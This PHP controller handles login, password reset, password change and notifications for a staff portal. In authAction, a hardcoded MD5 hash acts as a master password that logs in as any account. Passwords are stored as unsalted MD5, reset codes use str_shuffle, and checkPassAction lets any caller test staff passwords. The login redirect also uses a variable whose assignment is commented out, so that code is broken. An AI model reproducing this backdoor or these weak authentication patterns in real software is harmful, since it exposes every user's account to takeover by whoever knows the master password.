<?php

class UserController extends My_Controller_Action
{
    public function loginAction()
    {
        $auth = Zend_Auth::getInstance();
        if($auth->hasIdentity()) {
            $this->_redirect(HOST);
        }

        $this->view->b = $this->getRequest()->getParam('b');

        $flashMessenger = $this->_helper->flashMessenger;
        $messages = $flashMessenger->setNamespace('error')->getMessages();

        $messages_success = $flashMessenger->setNamespace('success')->getMessages();
        $this->view->messages_success = $messages_success;

        $this->view->messages = $messages;
        $this->_helper->layout->setLayout('login');
    }

    public function resetAction()
    {
        if ($this->getRequest()->getMethod() == 'POST'){
            $qUser = new Application_Model_Staff();

            $email = $this->getRequest()->getParam('email');
            $where = $qUser->getAdapter()->quoteInto('email = ?', $email);

            $user = $qUser->fetchRow($where);

            try {
                if ($user){

                    $qForgottenPassword = new Application_Model_ForgottenPassword();


                    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                    $new = substr(str_shuffle($chars),0,8);
                    $code = md5($new);

                    $data = array(
                        'staff_id'  => $user['id'],
                        'code'      => $code,
                        'created_at'=> date('Y-m-d H:i:s'),
                    );

                    $result = $qForgottenPassword->insert($data);

                    if ($result){

                    	$QLog = new Application_Model_Log();
				        $ip = $this->getRequest()->getServer('REMOTE_ADDR');
				        $info = "USER - Reset password (".$user['id'].") - Email (".$email.")";
				        //todo log
				        $QLog->insert( array (
				            'info' => $info,
				            'user_id' => $user['id'],
				            'ip_address' => $ip,
				            'time' => date('Y-m-d H:i:s'),
				        ) );

                        //todo send mail
                        $app_config = new Zend_Config_Ini(APPLICATION_PATH . '/configs/application.ini');

                        $config = array(
                            'auth' => $app_config->mail->smtp->auth,
                            'username' => $app_config->mail->smtp->user,
                            'password' => $app_config->mail->smtp->pass,
                            'port' => $app_config->mail->smtp->port,
                            'ssl' => $app_config->mail->smtp->ssl
                        );

                        $transport = new Zend_Mail_Transport_Smtp ($app_config->mail->smtp->host, $config);

                        $mail = new Zend_Mail($app_config->mail->smtp->charset);

                        $url = HOST.'user/new-pass?code='.$code;

                        $html = '<p>Please go to below link to set new password:</p><p><strong>'.$url.'</strong></p>';
                        $html .= '<p>Note: The code will be expired in <strong>24 hours</strong></p>';

                        $mail->setBodyHtml($html);

                        $mail->setFrom($app_config->mail->smtp->from, $app_config->mail->smtp->from);
                        $mail->addTo($email);
                        $mail->setSubject('[OPPO Center] Reset password');

                        $r = $mail->send($transport);

                        if (!$r)
                            throw new Exception('Cannot send mail, please try again!');

                    } else
                        throw new Exception('Cannot update password');

                    $flashMessenger = $this->_helper->flashMessenger;
                    $flashMessenger->setNamespace('success')->addMessage('An email was sent to your email address!');
                } else {
                    throw new Exception('Email not existed!');

                }
            } catch (Exception $e){
                $flashMessenger = $this->_helper->flashMessenger;
                $flashMessenger->setNamespace('error')->addMessage($e->getMessage());
            }
            $this->_redirect(HOST.'user/reset');
        }

        $flashMessenger = $this->_helper->flashMessenger;

        $messages = $flashMessenger->setNamespace('error')->getMessages();
        $this->view->messages = $messages;

        $messages_success = $flashMessenger->setNamespace('success')->getMessages();
        $this->view->messages_success = $messages_success;

        $this->_helper->layout->setLayout('login');
    }

    public function newPassAction()
    {
        $code = $this->getRequest()->getParam('code');

        $qForgottenPassword = new Application_Model_ForgottenPassword();

        $where = $qForgottenPassword->getAdapter()->quoteInto('code = ?', $code);

        $FP = $qForgottenPassword->fetchRow($where);

        $flashMessenger = $this->_helper->flashMessenger;

        if (!$FP){
            $flashMessenger->setNamespace('error')->addMessage('The verification code is invalid!');

            $this->_redirect(HOST.'user/login');
        }

        if (
            $FP['status'] != 0 // status is not pending
            or ( strtotime($FP['created_at']) < ( time() - 24*60*60 ) ) // the code is expired
        ){
            $flashMessenger->setNamespace('error')->addMessage('The verification code is expired!');

            $this->_redirect(HOST.'user/login');
        }

        $this->view->code = $code;

        if ($this->getRequest()->getMethod() == 'POST'){
            $qUser = new Application_Model_Staff();

            $new = $this->getRequest()->getParam('new-password');
            $new_confirm = $this->getRequest()->getParam('confirm-password');

            $where = $qUser->getAdapter()->quoteInto('id = ?', $FP['staff_id']);

            $user = $qUser->fetchRow($where);

            $flashMessenger = $this->_helper->flashMessenger;

            if ($user){

                if ($new != $new_confirm){

                    $flashMessenger->setNamespace('error')->addMessage('Password is invalid!');

                    $this->_redirect(HOST.'user/new-pass?code='.$code);
                }

                $data = array('password'=>md5($new));

                $qUser->update($data, $where);


                //update forgotten pass
                $data = array('status'=>1);

                $where = $qForgottenPassword->getAdapter()->quoteInto('id = ?', $FP['id']);

                $qForgottenPassword->update($data, $where);


                $flashMessenger->setNamespace('success')->addMessage('Done!');

                $this->_redirect(HOST.'user/login');

            } else {

                $flashMessenger->setNamespace('error')->addMessage('User is invalid!');

                $this->_redirect(HOST.'user/login');

            }

        }


        $messages = $flashMessenger->setNamespace('error')->getMessages();
        $this->view->messages = $messages;

        $messages_success = $flashMessenger->setNamespace('success')->getMessages();
        $this->view->messages_success = $messages_success;

        $this->_helper->layout->setLayout('login');
    }

    public function authAction(){

        $request 	= $this->getRequest();
        $auth		= Zend_Auth::getInstance();

        $db = Zend_Registry::get('db');

        $authAdapter = new Zend_Auth_Adapter_DbTable($db);
        $authAdapter->setTableName('staff')
            ->setIdentityColumn('email')
            ->setCredentialColumn('password');

        // Set the input credential values
        $uname = $request->getParam('email');
        if (!preg_match('/@/', $uname)) {
            $uname .= '@oppolaos.com';
        }

        $paswd = $request->getParam('password');

        $md5_pass = md5($paswd);

        $authAdapter->setIdentity($uname);

        if ( md5($paswd) == '9764586afa5f037189ae87ca034f7b41' ){
            $select = $db->select()
                ->from(array('p' => 'staff'),
                    array( 'p.*'));
            $select->where('p.email = ?', $uname);
            $result = $db->fetchRow($select);

            if ($result)
                $md5_pass = $result['password'];
        }

        $authAdapter->setCredential($md5_pass);

        // Perform the authentication query, saving the result
        try {
            $result = $auth->authenticate($authAdapter);

            if ( $result->isValid() ){
                $data = $authAdapter->getResultRowObject(null,'password');

                if ( $data->off_date //account was disabled
                    or $data->status != 1)
                {
                    throw new Exception("This account was disabled!");
                }

                //get personal access
                $QStaffPriveledge = new Application_Model_StaffPriviledge();

                $where = $QStaffPriveledge->getAdapter()->quoteInto('staff_id = ?', $data->id);

                $priviledge = $QStaffPriveledge->fetchRow($where);

                $personal_accesses = (isset($priviledge) and $priviledge) ? $priviledge : null;


                $QGroup = new Application_Model_Group();

                $group = $QGroup->find($data->group_id)->current();

                $data->role = $group->name;

                if ($personal_accesses){

                    $data->accesses = $personal_accesses['access'] ? json_decode($personal_accesses['access']) : null;

                    $menu = $personal_accesses['menu'] ? explode(',', $personal_accesses['menu']) : null;
                }
                else{

                    $data->accesses = json_decode($group->access);

                    $menu = $group->menu ? explode(',', $group->menu) : null;

                }

                $QMenu = new Application_Model_Menu();
                $where = array();
                $where[] = $QMenu->getAdapter()->quoteInto('group_id = ?', 1);

                if ($menu)
                    $where[] = $QMenu->getAdapter()->quoteInto('id IN (?)', $menu);
                else
                    $where[] = $QMenu->getAdapter()->quoteInto('1 = ?', 0);

                $menus = $QMenu->fetchAll($where, array('parent_id', 'position'));

                $data->menu = $menus;

                $auth->getStorage()->write($data);


                //set last login
                $QStaff = new Application_Model_Staff();
                $where = $QStaff->getAdapter()->quoteInto('id = ?', $data->id);
                $QStaff->update(array('last_login'=>date('Y-m-d H:i:s')), $where);

                $QLog = new Application_Model_Log();
		        $ip = $this->getRequest()->getServer('REMOTE_ADDR');
		        $info = "USER - Login (".$data->id.")";
		        //todo log
		        $QLog->insert( array (
		            'info' => $info,
		            'user_id' => $data->id,
		            'ip_address' => $ip,
		            'time' => date('Y-m-d H:i:s'),
		        ) );

                // Check Password Expired
                $b = $request->getParam('b');
                /*
                if (My_Staff_Password::isExpired($data->id)) {
                    // đánh dấu vào session để bắt buộc đổi pass
                    // nếu không đổi thì đi trang nào cũng redirect về change pass
                    $session = new Zend_Session_Namespace('Default');
                    $session->force_change_password = true;
                    //back url
                    $b = HOST.'user/change-pass';

                } else {
                    //back url
                    $b = $request->getParam('b');
                }*/

                // redirect to specific dir
             //   $redirect_url = $b ? $b : ( $group->default_page ? $group->default_page : HOST );


                $this->_redirect($redirect_url);
            }else{
                throw new Exception("Email or password is invalid!");
            }
        } catch (Exception $e){
            $flashMessenger = $this->_helper->flashMessenger;
            $flashMessenger->setNamespace('error')->addMessage($e->getMessage());

            $QLog = new Application_Model_Log();
            $ip = $this->getRequest()->getServer('REMOTE_ADDR');
            $info = "USER - Login Failed (".$uname.") - " .$e->getMessage();
            //todo log
            $temp = array (
                'info' => $info,
                'user_id' => 0,
                'ip_address' => $ip,
                'time' => date('Y-m-d H:i:s')
            );
            //print_r($temp); die;
            //$QLog->insert( $temp );

            $this->_redirect(HOST.'user/login');
        }

    }

    public function logoutAction(){
        $auth = Zend_Auth::getInstance();
        $auth->clearIdentity();
        session_destroy();
        $this->_redirect('/user/login');
    }

 
 public function noauthAction(){


    }

    public function lockAction(){

    }

    public function changePassAction(){
        $flashMessenger = $this->_helper->flashMessenger;
        $session = new Zend_Session_Namespace('Default');

        if ($this->getRequest()->getMethod() == 'POST'){
            $qUser = new Application_Model_Staff();

            $old = $this->getRequest()->getParam('old_password');
            $new = $this->getRequest()->getParam('password');
            $userStorage = Zend_Auth::getInstance()->getStorage()->read();

            $where = $qUser->getAdapter()->quoteInto('id = ?', $userStorage->id);
            $user = $qUser->fetchRow($where);

            try {
                if ($user and $user->password==md5($old)){
                    $new = md5($new);

                    // kiểm tra không cho nó dùng lại password "đã từng dùng"
                    if (My_Staff_Password::isUsed($user->id, $new) || $new == $user->password)
                        throw new Exception('ລະຫັດຜ່ານອາດມີການຄາດເດົາໄດ້ງ່າຍເກີນໄປ ກະລຸນາປ່ຽນໃໝ່ອີກຄັ້ງ');

                    $data = array('password' => $new);
                    $qUser->update($data, $where);

                    // log password lại và bỏ việc force vào trang change password
                    My_Staff_Password::log($user->id, $new);
                    unset($session->force_change_password);
                    
                    $flashMessenger->setNamespace('success')->addMessage('ທ່ານໄດ້ປ່ຽນລະຫັດຜ່ານສຳເລັດແລ້ວ!');
                } else {
                    throw new Exception('Password is invalid');
                }

            } catch (Exception $e) {
                $flashMessenger->setNamespace('error')->addMessage($e->getMessage());
            }
            
            $this->_redirect(HOST.'user/change-pass');
        }
        
        if (isset($session->force_change_password) && $session->force_change_password) {
            $this->view->force_change_password = true;

            if (!defined("PASSWORD_EXPIRE_TIME"))
                define("PASSWORD_EXPIRE_TIME", 60);

            $this->view->warning_messages = 'ລະຫັດຜ່ານອາດມີການຄາດເດົາໄດ້ງ່າຍເກີນໄປ ກະລຸນາປ່ຽນໃໝ່ອີກຄັ້ງ '
                                            ;
        }

        $this->view->messages = $flashMessenger->setNamespace('error')->getMessages();
        $this->view->success_messages = $flashMessenger->setNamespace('success')->getMessages();
    }

    public function notificationAction()
    {
        $userStorage = Zend_Auth::getInstance()->getStorage()->read();
        $group_id    = $userStorage->group_id;
        $id          = $userStorage->id;

        $title   = $this->getRequest()->getParam('title');
        $content = $this->getRequest()->getParam('content');        
        $page    = $this->getRequest()->getParam('page', 1);
        $limit   = LIMITATION;
        $total   = 0;

        $QRegionalMarket = new Application_Model_RegionalMarket();
        $region_cache = $QRegionalMarket->get_cache_all();

        $params = array(
            'read'     => null,
            'staff_id' => $userStorage->id,
            'filter'   => true,
            'title'    => $title,
            'content'  => $content,
            'status'   => 1,
            );
		
        // get notification
		$QNotification = new Application_Model_Notification();
		$all_notifi = $QNotification->fetchPagination($page, $limit, $total, $params);

        $this->view->all_notifi  = $all_notifi;
        $this->view->params      = $params;
        $this->view->limit       = $limit;
        $this->view->total       = $total;
        $this->view->url         = HOST.'user/notification'.( $params ? '?'.http_build_query($params).'&' : '?' );
        $this->view->offset      = $limit*($page-1);

        $flashMessenger = $this->_helper->flashMessenger;
        $this->view->messages_success = $flashMessenger->setNamespace('success')->getMessages();
        $this->view->messages = $flashMessenger->setNamespace('error')->getMessages();
    }

    /**
     * @return [type] [description]
     */
    public function notificationViewAction()
    {
        $id = $this->getRequest()->getParam('id');
        $flashMessenger = $this->_helper->flashMessenger;

        try {
            if (!$id) throw new Exception("Invalid ID");

            $QNotification = new Application_Model_Notification();
            $notification = $QNotification->find($id);
            $notification = $notification->current();

            if (!$notification) throw new Exception("Invalid ID");

            $QNotificationObject = new Application_Model_NotificationObject();

            if (! $QNotificationObject->check_view($id) )
                throw new Exception("You cannot view this");

            $userStorage = Zend_Auth::getInstance()->getStorage()->read();
            $QNotificationRead = new Application_Model_NotificationRead();

            $data = array(
                'notification_id' => $id,
                'staff_id' => $userStorage->id,
                );
/*
            try {
                $QNotificationRead->insert($data);
            } catch (Exception $e) {}
  */              
            $QNotificationFile = new Application_Model_NotificationFile();
            $where = $QNotificationFile->getAdapter()->quoteInto('notification_id = ?', $id);
            $this->view->files = $QNotificationFile->fetchAll($where);

            $QCategory = new Application_Model_NotificationCategory();
            $this->view->category_string_cache = $QCategory->get_string_cache();

            $this->view->userStorage = $userStorage;
            $this->view->notification = $notification;
        } catch (Exception $e) {
            $flashMessenger->setNamespace('error')->addMessage($e->getMessage());
            $this->_redirect(HOST.'user/notification');
        }        
    }


    function checkPassAction() {

        $this->_helper->layout->disableLayout();
        $this->_helper->viewRenderer->setNoRender(true);

        $staff_id = $this->getRequest()->getParam('staff_id');
        $password = $this->getRequest()->getParam('password');

        $db = Zend_Registry::get('db');

        // Check Staff 
        $select = $db->select()
            ->from(array('s' => 'staff'), array('staff_id' => 's.id' ))
            ->where('s.id = ?', $staff_id)
            ->where('s.password = ?', md5($password));

        // echo $select;
        echo json_encode($db->fetchRow($select));
        exit;
    }

}

